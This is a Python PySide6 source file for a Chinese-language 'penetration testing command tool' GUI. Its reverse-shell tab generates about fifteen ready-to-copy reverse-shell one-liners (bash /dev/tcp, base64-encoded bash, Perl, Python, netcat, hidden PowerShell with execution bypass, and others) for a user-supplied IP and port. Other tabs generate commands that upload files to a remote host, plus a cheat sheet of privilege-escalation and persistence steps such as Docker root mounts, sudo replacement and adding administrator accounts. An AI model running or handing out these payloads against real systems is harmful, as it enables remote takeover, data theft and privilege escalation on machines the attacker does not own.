import sys
import base64
from PySide6.QtWidgets import (QApplication, QMainWindow, QTabWidget, QWidget, QVBoxLayout,
                               QHBoxLayout, QLabel, QLineEdit, QPushButton, QGridLayout,
                               QScrollArea, QFrame, QTextEdit, QSplitter, QGroupBox, QFormLayout)
from PySide6.QtCore import Qt
from PySide6.QtGui import QFont, QSyntaxHighlighter, QTextCharFormat, QColor, QBrush


class CommandHighlighter(QSyntaxHighlighter):
    """自定义语法高亮器，用于突出显示命令"""

    def __init__(self, parent=None):
        super().__init__(parent)
        self.highlightingRules = []

        # 命令高亮 (绿色背景)
        command_format = QTextCharFormat()
        command_format.setBackground(QBrush(QColor(220, 255, 220)))
        command_format.setFontWeight(QFont.Bold)
        self.highlightingRules.append((r'^\$ .*$', command_format))

        # 重要参数高亮 (蓝色)
        param_format = QTextCharFormat()
        param_format.setForeground(QBrush(QColor(0, 0, 255)))
        self.highlightingRules.append((r' -[a-zA-Z0-9]+', param_format))

        # 注释高亮 (灰色)
        comment_format = QTextCharFormat()
        comment_format.setForeground(QBrush(QColor(128, 128, 128)))
        self.highlightingRules.append((r'#.*$', comment_format))

    def highlightBlock(self, text):
        pass
        # for pattern, format in self.highlightingRules:
        #     expression = pattern
        #     index = text.indexOf(expression)
        #     while index >= 0:
        #         length = expression.matchedLength()
        #         self.setFormat(index, length, format)
        #         index = text.indexOf(expression, index + length)


class CommandTool(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("渗透测试命令工具")
        self.setMinimumSize(1000, 700)

        # 创建主布局
        self.central_widget = QWidget()
        self.setCentralWidget(self.central_widget)
        self.main_layout = QVBoxLayout(self.central_widget)

        # 创建标签页控件
        self.tabs = QTabWidget()
        self.main_layout.addWidget(self.tabs)

        # 添加各个功能标签页
        self.create_reverse_shell_tab()
        self.create_file_upload_tab()
        self.create_file_download_tab()
        self.create_common_commands_tab()

        # 状态栏
        self.statusBar().showMessage("就绪")

    def create_reverse_shell_tab(self):
        """创建反弹shell标签页"""
        tab = QWidget()
        layout = QVBoxLayout(tab)

        # 创建输入区域
        input_frame = QGroupBox()
        input_groupbox = QVBoxLayout(input_frame)
        # input_frame.setFrameShape(QFrame.StyledPanel)
        input_layout = QHBoxLayout()

        input_layout.addWidget(QLabel("本地IP:"))
        self.reverse_ip = QLineEdit("127.0.0.1")
        input_layout.addWidget(self.reverse_ip)

        input_layout.addWidget(QLabel("本地端口:"))
        self.reverse_port = QLineEdit("4444")
        input_layout.addWidget(self.reverse_port)

        # 生成按钮
        buttom_layout = QHBoxLayout()

        generate_btn = QPushButton("生成命令")
        generate_btn.clicked.connect(self.generate_reverse_shell)
        buttom_layout.addWidget(generate_btn)

        # 创建输出区域
        self.reverse_output_area = QScrollArea()
        self.reverse_output_area.setWidgetResizable(True)
        self.reverse_output_widget = QWidget()
        self.reverse_output_layout = QVBoxLayout(self.reverse_output_widget)
        self.reverse_output_area.setWidget(self.reverse_output_widget)

        # 添加到主布局
        # layout.addWidget(QLabel("反弹Shell生成器"))
        input_groupbox.addLayout(input_layout)
        input_groupbox.addLayout(buttom_layout)
        layout.addWidget(input_frame)
        layout.addWidget(self.reverse_output_area)

        self.tabs.addTab(tab, "反弹Shell")

    def create_file_upload_tab(self):
        """创建文件上传标签页"""
        tab = QWidget()
        layout = QVBoxLayout(tab)

        # 创建输入区域
        input_frame = QGroupBox()
        input_groupbox = QVBoxLayout(input_frame)
        # input_frame.setFrameShape(QFrame.StyledPanel)
        input_layout = QHBoxLayout()

        input_layout.addWidget(QLabel("本地IP:"))
        self.upload_ip = QLineEdit("127.0.0.1")
        input_layout.addWidget(self.upload_ip)

        input_layout.addWidget(QLabel("本地端口:"))
        self.upload_port = QLineEdit("8000")
        input_layout.addWidget(self.upload_port)

        input_layout.addWidget(QLabel("上传的文件名:"))
        self.upload_filename = QLineEdit("example.txt")
        input_layout.addWidget(self.upload_filename)

        # 生成按钮
        buttom_layout = QHBoxLayout()
        generate_btn = QPushButton("生成命令")
        generate_btn.clicked.connect(self.generate_file_upload)
        buttom_layout.addWidget(generate_btn)

        # 创建输出区域
        self.upload_output_area = QScrollArea()
        self.upload_output_area.setWidgetResizable(True)
        self.upload_output_widget = QWidget()
        self.upload_output_layout = QVBoxLayout(self.upload_output_widget)
        self.upload_output_area.setWidget(self.upload_output_widget)


        # 添加到主布局
        input_groupbox.addLayout(input_layout)
        input_groupbox.addLayout(buttom_layout)
        layout.addWidget(input_frame)
        layout.addWidget(self.upload_output_area)

        self.tabs.addTab(tab, "文件上传")

    def create_file_download_tab(self):
        """创建文件下载标签页"""
        tab = QWidget()
        layout = QVBoxLayout(tab)

        # 创建输入区域
        input_frame = QGroupBox()
        input_groupbox = QVBoxLayout(input_frame)
        # input_frame.setFrameShape(QFrame.StyledPanel)
        input_layout = QHBoxLayout()

        input_layout.addWidget(QLabel("本地IP:"))
        self.download_ip = QLineEdit("127.0.0.1")
        input_layout.addWidget(self.download_ip)

        input_layout.addWidget(QLabel("本地端口:"))
        self.download_port = QLineEdit("8000")
        input_layout.addWidget(self.download_port)

        input_layout.addWidget(QLabel("下载的文件名:"))
        self.download_filename = QLineEdit("example.txt")
        input_layout.addWidget(self.download_filename)

        # 生成按钮
        buttom_layout = QHBoxLayout()

        generate_btn = QPushButton("生成命令")
        generate_btn.clicked.connect(self.generate_file_download)
        buttom_layout.addWidget(generate_btn)

        # 创建输出区域
        self.download_output_area = QScrollArea()
        self.download_output_area.setWidgetResizable(True)
        self.download_output_widget = QWidget()
        self.download_output_layout = QVBoxLayout(self.download_output_widget)
        self.download_output_area.setWidget(self.download_output_widget)

        # 添加到主布局
        input_groupbox.addLayout(input_layout)
        input_groupbox.addLayout(buttom_layout)
        layout.addWidget(input_frame)
        layout.addWidget(self.download_output_area)

        self.tabs.addTab(tab, "文件下载")

    def create_common_commands_tab(self):
        """创建常用命令标签页"""
        tab = QWidget()
        layout = QVBoxLayout(tab)

        # 创建滚动区域
        scroll_area = QScrollArea()
        scroll_area.setWidgetResizable(True)
        scroll_content = QWidget()
        scroll_layout = QVBoxLayout(scroll_content)

        # 创建文本编辑框
        self.common_commands_text = QTextEdit()
        self.common_commands_text.setReadOnly(True)
        self.common_commands_text.setLineWrapMode(QTextEdit.NoWrap)
        # self.common_commands_text.setMinimumHeight(500)

        # 设置语法高亮
        self.highlighter = CommandHighlighter(self.common_commands_text.document())

        # 填充命令内容
        self.update_common_commands_text()

        # 添加到布局
        scroll_layout.addWidget(self.common_commands_text)
        scroll_area.setWidget(scroll_content)
        layout.addWidget(scroll_area)

        # 添加复制按钮
        copy_all_btn = QPushButton("复制全部命令")
        copy_all_btn.clicked.connect(self.copy_all_common_commands)
        layout.addWidget(copy_all_btn)

        self.tabs.addTab(tab, "常用命令")

    def update_common_commands_text(self):
        """更新常用命令文本内容"""
        content = "# 渗透测试常用命令参考\n\n"

        # Windows命令
        content += "## Windows 常用命令\n\n"
        for cmd, desc in self.get_windows_commands().items():
            content += f"### {cmd}\n"
            content += f"{desc}\n\n"

        # Linux命令
        content += "## Linux 常用命令\n\n"
        for cmd, desc in self.get_linux_commands().items():
            content += f"### {cmd}\n"
            content += f"{desc}\n\n"

        # 提权命令
        content += "## 权限提升命令\n\n"
        for cmd, desc in self.get_privilege_escalation().items():
            content += f"### {cmd}\n"
            content += f"{desc}\n\n"

        # 配置命令
        content += "## 系统配置命令\n\n"
        for cmd, desc in self.get_configuration_commands().items():
            content += f"### {cmd}\n"
            content += f"{desc}\n\n"

        self.common_commands_text.setPlainText(content)

    def get_windows_commands(self):
        """获取Windows常用命令"""
        return {
            "ipconfig": "$ ipconfig /all\n显示详细网络配置信息\n\n$ ipconfig /renew\n刷新DHCP租约\n\n$ ipconfig /flushdns\n清除DNS缓存",
            "netstat": "$ netstat -ano\n显示所有连接和监听端口\n\n$ netstat -ano | findstr :80\n查找特定端口的连接",
            "tasklist": "$ tasklist /svc\n显示每个进程关联的服务\n\n$ taskkill /F /IM notepad.exe\n强制终止进程",
            "systeminfo": "$ systeminfo\n显示系统详细信息\n\n$ systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\"\n查找特定信息",
            "net user": "$ net user\n显示所有用户账户\n\n$ net user username password /add\n创建新用户\n\n$ net localgroup administrators username /add\n将用户添加到管理员组",
            "reg": "$ reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\n查看启动项\n\n$ reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v MyApp /t REG_SZ /d \"C:\\MyApp.exe\"\n添加启动项",
            "powershell": "$ powershell -Command \"Get-Process\"\n获取当前进程\n\n$ powershell -Command \"Get-NetAdapter\"\n获取网络适配器信息",
            "ping": "$ ping www.example.com\n测试与目标主机的连通性\n\n$ ping -t www.example.com\n持续ping测试",
            "tracert": "$ tracert www.example.com\n显示数据包到目标主机的路径",
            "schtasks": "$ schtasks /query\n查看所有计划任务\n\n$ schtasks /create /sc daily /tn \"MyTask\" /tr \"C:\\MyApp.exe\" /st 23:00\n创建每日任务"
        }

    def get_linux_commands(self):
        """获取Linux常用命令"""
        return {
            "ifconfig/ip": "$ ifconfig -a\n显示所有网络接口\n\n$ ip addr show\n显示IP地址信息\n\n$ ip route\n显示路由表",
            "netstat/ss": "$ netstat -tulpn\n显示所有监听端口和连接\n\n$ ss -tulpn\n更高效的替代命令",
            "ps": "$ ps aux\n显示所有运行的进程\n\n$ ps aux | grep apache2\n查找特定进程",
            "top/htop": "$ top\n实时显示系统资源使用情况\n\n$ htop\n更友好的系统监控工具",
            "ls": "$ ls -la\n显示详细信息，包括隐藏文件\n\n$ ls -ltr\n按修改时间排序",
            "cd": "$ cd /tmp\n切换到/tmp目录\n\n$ cd ..\n返回上级目录",
            "mkdir/rm": "$ mkdir test\n创建test目录\n\n$ rm -r test\n递归删除目录",
            "cat/tail": "$ cat file.txt\n显示文件全部内容\n\n$ tail -f file.log\n实时监控日志文件",
            "grep": "$ grep 'error' /var/log/syslog\n在日志中搜索错误信息\n\n$ grep -r 'password' /etc\n递归搜索包含password的文件",
            "chmod/chown": "$ chmod +x script.sh\n添加执行权限\n\n$ chown user:group file.txt\n更改文件所有者和组"
        }

    def get_privilege_escalation(self):
        """获取提权命令"""
        return {
            "sudo": "$ sudo apt-get update\n使用管理员权限更新软件包\n\n$ sudo -i\n获取root shell",
            "SUID二进制文件": "$ find / -perm -4000 2>/dev/null\n查找所有SUID文件\n\n/usr/bin/passwd\n常见SUID文件示例",
            "内核漏洞利用": "$ searchsploit linux kernel 4.4\n搜索适用于特定内核的漏洞利用\n\n$ exploitdb search kernel `uname -r`\n搜索当前内核的漏洞",
            "环境变量劫持": "$ export PATH=.:$PATH\n将当前目录添加到PATH开头\n\n$ mv /tmp/evil_sudo /usr/local/bin/sudo\n替换sudo命令",
            "计划任务漏洞": "$ cat /etc/crontab\n查看系统计划任务\n\n修改可写的计划任务脚本添加恶意内容",
            "Docker提权": "$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh\n使用Docker挂载主机根目录",
            "SSH密钥权限": "$ chmod 600 id_rsa\n设置私钥正确权限\n\n$ ssh -i id_rsa user@host\n使用私钥登录"
        }

    def get_configuration_commands(self):
        """获取配置命令"""
        return {
            "防火墙配置": "### Linux\n$ ufw allow 22\n允许SSH端口\n\n$ ufw enable\n启用防火墙\n\n### Windows\n$ netsh advfirewall firewall add rule name=\"Open Port 80\" dir=in action=allow protocol=TCP localport=80\n允许TCP 80端口",
            "服务管理": "### Linux\n$ systemctl start apache2\n启动Apache服务\n\n$ systemctl enable apache2\n设置开机自启\n\n### Windows\n$ net start wuauserv\n启动Windows Update服务\n\n$ sc config wuauserv start=auto\n设置自动启动",
            "网络配置": "### Linux\n编辑/etc/network/interfaces\n静态IP配置\n\n$ ifup eth0\n启用网络接口\n\n### Windows\n$ netsh interface ip set address name=\"Ethernet\" static 192.168.1.100 255.255.255.0 192.168.1.1\n设置静态IP",
            "用户管理": "### Linux\n$ useradd -m username\n创建新用户\n\n$ passwd username\n设置用户密码\n\n$ usermod -aG sudo username\n添加到sudo组\n\n### Windows\n$ net user username password /add\n创建新用户\n\n$ net localgroup administrators username /add\n添加到管理员组",
            "日志查看": "### Linux\n$ cat /var/log/syslog\n查看系统日志\n\n$ tail -f /var/log/auth.log\n实时监控认证日志\n\n### Windows\n$ wevtutil qe System /c:10 /rd:true /f:text\n查看系统事件日志",
            "软件包管理": "### Linux\n$ apt-get install package\nDebian/Ubuntu系统安装软件\n\n$ yum install package\nRedHat/CentOS系统安装软件\n\n### Windows\n$ choco install package\n使用Chocolatey安装软件"
        }

    def generate_reverse_shell(self):
        """生成反弹shell命令"""
        # 清除现有布局
        while self.reverse_output_layout.count():
            child = self.reverse_output_layout.takeAt(0)
            if child.widget():
                child.widget().deleteLater()

        ip = self.reverse_ip.text()
        port = self.reverse_port.text()

        # 生成正确的bash base64编码
        bash_command = f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
        bash_bytes = bash_command.encode('ascii')
        bash_base64 = base64.b64encode(bash_bytes).decode('ascii')

        commands = {
            "Bash": f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
            "Bash (base64)": f"bash -c '{{echo,{bash_base64}}}|{{base64,-d}}|{{bash,-i}}'",
            "Perl": f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
            "Python": f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
            "Python (改进版)": f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'",
            "Ruby": f"ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
            "PHP": f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            "Java": f"r = Runtime.getRuntime()\np = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do \\$line 2>&5 >&5; done\"] as String[])\np.waitFor()",
            "Netcat传统": f"nc -e /bin/sh {ip} {port}",
            "Netcat开放BSD": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f",
            "PowerShell": f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\"",
            "PowerShell2":f'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient({ip},{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"',
            "Node.js": f"require('child_process').exec('nc -e /bin/sh {ip} {port}')",
            "Lua": f"lua -e \"require('socket');require('os');t=socket.tcp();t:connect('{ip}','{port}');os.execute('/bin/sh -i <&3 >&3 2>&3');\"",
            "Golang": f"echo 'package main;import\"os/exec\";import\"net\";func main(){{c,_:=net.Dial(\"tcp\",\"{ip}:{port}\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go",
        }

        for name, cmd in commands.items():
            frame = QFrame()
            # frame.setFrameShape(QFrame.StyledPanel)
            # frame.setStyleSheet("QFrame {margin: 2px;}")
            # frame.setStyleSheet("""
            #                 QFrame {
            #                     margin: 5px 0;  /* 上下外边距，控制行与行之间的间距 */
            #                 }
            #                 QLineEdit {
            #                     height: 25px;  /* 固定行高 */
            #                     margin: 2px 0; /* 上下内边距，可微调行内空间 */
            #                 }
            #             """)
            layout = QHBoxLayout(frame)

            label = QLabel(f"{name}:")
            layout.addWidget(label)

            line_edit = QLineEdit(cmd)
            line_edit.setReadOnly(True)
            line_edit.setCursorPosition(0)
            layout.addWidget(line_edit)

            copy_btn = QPushButton("复制")
            copy_btn.clicked.connect(lambda checked, txt=line_edit: self.copy_to_clipboard(txt.text()))
            layout.addWidget(copy_btn)

            layout.setAlignment(Qt.AlignmentFlag.AlignTop | Qt.AlignmentFlag.AlignLeft)
            layout.setSpacing(5)  # 行间距
            layout.setContentsMargins(5, 5, 5, 5)  # 边距

            self.reverse_output_layout.addWidget(frame)


        self.statusBar().showMessage(f"已生成{len(commands)}种反弹Shell命令")


    def generate_file_upload(self):
        """生成文件上传命令"""
        # 清除现有布局
        while self.upload_output_layout.count():
            child = self.upload_output_layout.takeAt(0)
            if child.widget():
                child.widget().deleteLater()

        ip = self.upload_ip.text()
        port = self.upload_port.text()
        filename = self.upload_filename.text()

        commands = {
            "Python HTTP服务器": f"curl -X POST -F \"file=@/{filename}\" http://{ip}:{port}/upload",
            "Netcat": f"nc {ip} {port} < {filename}",
            "SCP": f"scp {filename} user@{ip}:~/{filename}",
            "FTP": f"echo -e \"user\npassword\ncd directory\nput {filename}\nbye\" | ftp {ip}",
            "TFTP": f"tftp {ip}\nput {filename}\nquit",
            "Wget": f"wget --post-file={filename} http://{ip}:{port}/upload",
            "Curl": f"curl -T {filename} ftp://{ip}:{port}/",
            "SMB": f"copy {filename} \\\\{ip}\\share\\{filename}",
            "rsync": f"rsync {filename} user@{ip}:~/{filename}"
        }

        for name, cmd in commands.items():
            frame = QFrame()
            # frame.setStyleSheet("QFrame {margin: 2px;}")
            layout = QHBoxLayout(frame)

            label = QLabel(f"{name}:")
            layout.addWidget(label)

            line_edit = QLineEdit(cmd)
            line_edit.setReadOnly(True)
            line_edit.setCursorPosition(0)
            layout.addWidget(line_edit)

            copy_btn = QPushButton("复制")
            copy_btn.clicked.connect(lambda checked, txt=line_edit: self.copy_to_clipboard(txt.text()))
            layout.addWidget(copy_btn)

            layout.setAlignment(Qt.AlignmentFlag.AlignTop | Qt.AlignmentFlag.AlignLeft)
            layout.setSpacing(5)  # 行间距
            layout.setContentsMargins(5, 5, 5, 5)  # 边距
            self.upload_output_layout.addWidget(frame)

        self.statusBar().showMessage(f"已生成{len(commands)}种文件上传命令")

    def generate_file_download(self):
        """生成文件下载命令"""
        # 清除现有布局
        while self.download_output_layout.count():
            child = self.download_output_layout.takeAt(0)
            if child.widget():
                child.widget().deleteLater()

        ip = self.download_ip.text()
        port = self.download_port.text()
        filename = self.download_filename.text()

        commands = {
            "Python HTTP服务器": f"wget http://{ip}:{port}/{filename} -O {filename}",
            "Netcat": f"nc {ip} {port} > {filename}",
            "SCP": f"scp user@{ip}:{filename} .",
            "FTP": f"echo -e \"user\npassword\ncd directory\nget {filename}\nbye\" | ftp {ip}",
            "TFTP": f"atftp --get --remote-file {filename} {ip} -l {filename} --port 69",
            "Wget": f"wget -O {filename} http://{ip}:{port}/{filename}",
            "Curl": f"curl -o {filename} http://{ip}:{port}/{filename}",
            "SMB": f"copy \\\\{ip}\\share\\{filename} {filename}"
        }

        for name, cmd in commands.items():
            frame = QFrame()
            frame.setFrameShape(QFrame.StyledPanel)
            frame.setStyleSheet("QFrame {margin: 2px;}")
            layout = QHBoxLayout(frame)

            label = QLabel(f"{name}:")
            layout.addWidget(label)

            line_edit = QLineEdit(cmd)
            line_edit.setReadOnly(True)
            line_edit.setCursorPosition(0)
            layout.addWidget(line_edit)

            copy_btn = QPushButton("复制")
            copy_btn.clicked.connect(lambda checked, txt=line_edit: self.copy_to_clipboard(txt.text()))
            layout.addWidget(copy_btn)

            layout.setAlignment(Qt.AlignmentFlag.AlignTop | Qt.AlignmentFlag.AlignLeft)
            layout.setSpacing(5)  # 行间距
            layout.setContentsMargins(5, 5, 5, 5)  # 边距

            self.download_output_layout.addWidget(frame)

        self.statusBar().showMessage(f"已生成{len(commands)}种文件下载命令")

    def copy_to_clipboard(self, text):
        """复制文本到剪贴板"""
        clipboard = QApplication.clipboard()
        clipboard.setText(text)
        self.statusBar().showMessage("已复制到剪贴板")

    def copy_all_common_commands(self):
        """复制所有常用命令"""
        text = self.common_commands_text.toPlainText()
        self.copy_to_clipboard(text)


if __name__ == "__main__":
    app = QApplication(sys.argv)

    # 设置中文显示
    # font = QFont("SimHei")
    # app.setFont(font)

    window = CommandTool()
    window.show()
    sys.exit(app.exec_())